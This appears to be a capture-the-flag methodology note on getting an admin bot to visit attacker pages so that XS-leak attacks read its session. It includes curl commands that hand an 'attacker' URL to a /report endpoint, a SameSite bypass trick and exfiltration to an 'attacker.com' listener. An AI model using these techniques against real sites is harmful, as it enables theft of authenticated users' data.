# Bot delivery — the victim-viewer that carries the session

An XS-leak reads under the bot's session — the bot's load is the
oracle's trigger. The delivery shapes and the bot-context checks.

---

## 1. The bot's session — whose credential rides

```text
the bot carries the VICTIM's session — an admin/flag-holder context.
the leak reads the bot's credentialed response — not yours. verify
the bot has the session — a flag cookie, a logged-in context.
```

## 2. The /report endpoint — the canonical hand-off

```bash
# the bot visits your URL — for the CLASSIC shape
curl -X POST "$BASE/report" -d 'url=https://attacker/page'
# or a form field
curl -X POST "$BASE/visit" --data-urlencode 'url=<page>'
```

## 3. The sealed-bot — a fixed URL, no attacker page

```text
the bot visits a FIXED URL on the target — the attacker page is
unreachable. the leak is a server-state channel or a declarative
(CSS/HTML-only) oracle — no attacker JS runs.
```

## 4. The bot-context greps — the delivery surface

```bash
# the bot's config — the cookie, the URL field, the context
grep -rnoiE 'bot|admin|visit|report|puppeteer|playwright|chromium|selenium|headless|JSDOM|setCookie|createIncognito' <src> | head -20
# a Chrome managed policy — URLBlocklist/URLAllowlist
grep -rnoiE 'URLBlocklist|URLAllowlist|managed.*policy|incognito' <src> | head -10
# the flag-cookie — whose session
grep -rnoiE 'flag.*cookie|cookie.*flag|setCookie.*flag' <src> | head -10
```

## 5. The managed-policy bot — a URL allowlist

```text
a Chrome managed policy — 'URLBlocklist: ["*"]' + a one-entry
URLAllowlist — the bot can ONLY visit the target's own origin.
no attacker URL reaches it — the sealed shape is FORCED.
```

## 6. The SameSite interaction — does the cookie ride

```text
a SameSite=Lax cookie — the bot's fetch to YOUR page's cross-site
request doesn't attach it — the classic shape's credentialed fetch
fails. a meta-refresh issued BY THE TARGET bypasses it — a
same-site navigation.
SameSite=Strict — never cross-site.
```

## 7. The headless-bot signals — puppeteer/playwright

```bash
# the bot's engine — a headless chromium, a JSDOM, a selenium
grep -rnoiE 'puppeteer|playwright|chromium|headless|JSDOM|selenium|browser.*launch|newPage|goto' <src> | head -15
```

## 8. The bot's reachability — can it reach your listener

```text
the classic shape's read-back is your listener — the bot must reach
attacker.com. an airgapped bot → a server-state channel or a
write-back, not an external exfil.
```

## 9. The bot's timing — the visit's duration

```text
a bot that stays 5s vs 30s — the leak must fit in the visit's
window. a short visit → a high-bandwidth channel (a CSS oracle's
one-load set) not a slow sequential leak.
```

## 10. The delivery-verification — did the bot fire

```bash
# the bot's visit hitting your listener — the channel's proof
python3 tools/web/oob_listener.py hits
# a hit → the bot reached your page/listener → the channel works
```

## 11. The delivery-shapes table

```text
a bot that takes an attacker URL   → CLASSIC — your page's JS
a fixed-URL bot + script-block CSP → SEALED — a server-state/CSS oracle
a managed-policy allowlist bot     → SEALED — a declarative channel
an airgapped bot                   → a write-back / a server-state
a short-visit bot                  → a high-bandwidth one-load channel
```
